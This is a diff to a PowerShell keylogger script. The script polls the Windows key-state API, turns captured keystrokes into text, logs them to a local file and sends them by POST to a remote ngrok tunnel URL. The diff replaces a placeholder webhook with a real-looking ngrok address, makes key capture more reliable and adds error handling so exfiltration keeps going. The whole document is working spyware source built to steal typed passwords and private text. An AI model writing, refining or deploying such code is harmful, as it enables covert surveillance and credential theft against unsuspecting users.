@@ -18,9 +18,9 @@ if ($null -eq $API) {
     exit
 }
 
-# Set the webhook URL
-$webhookUri = "https://your-webhook-url.com"  # Replace with your actual webhook URL
-$outputFilePath = "C:\Users\keylog1.txt"
+$uri = "https://a2e6-60-243-45-209.ngrok-free.app"  # Replace with your Ngrok URL
+$headers = @{"Content-Type" = "application/json"}
+$outputFilePath = "C:\Users\keylog.txt"
 $keyCount = 0
 $keyBuffer = @()
 $startTime = Get-Date
@@ -39,7 +39,7 @@ while ($true) {
         $state = $API::GetAsyncKeyState($ascii)
 
         # Is key pressed?
-        if ($state -eq -32767) {
+        if ($state -eq -32767 -or ($state -band 0x8000)) {
             # Translate scan code to real code
             $virtualKey = $API::MapVirtualKey($ascii, 3)
 
@@ -53,7 +53,7 @@ while ($true) {
             # Translate virtual key
             $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
-            if ($success) {
+            if ($success -gt 0) {  # Check if success is greater than 0
                 # Add key to buffer
                 $keyBuffer += $mychar.ToString()
                 $keyCount++
@@ -64,17 +64,26 @@ while ($true) {
                     $keyBufferString = $keyBuffer -join ""
 
                     # Write captured text to file
-                    Add-Content -Path $outputFilePath -Value $keyBufferString
-
-                    Write-Host "Data written to file."
+                    try {
+                        Add-Content -Path $outputFilePath -Value $keyBufferString
+                        Write-Host "Data written to file."
+                    } catch {
+                        Write-Host "Error writing to file: $_"
+                    }
 
                     # Reset key count and buffer
                     $keyCount = 0
                     $keyBuffer = @()
 
-                    # Send data to webhook URI
-                    Invoke-WebRequest -Uri $webhookUri -Method POST -InFile $outputFilePath
-                    Write-Host "Data sent to webhook."
+                    # Send data to URI
+                    $body = @{"keylog" = $keyBufferString} | ConvertTo-Json
+
+                    try {
+                        Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body
+                        Write-Host "Data sent to URI."
+                    } catch {
+                        Write-Host "Failed to send data: $_"
+                    }
                 }
             }
         }
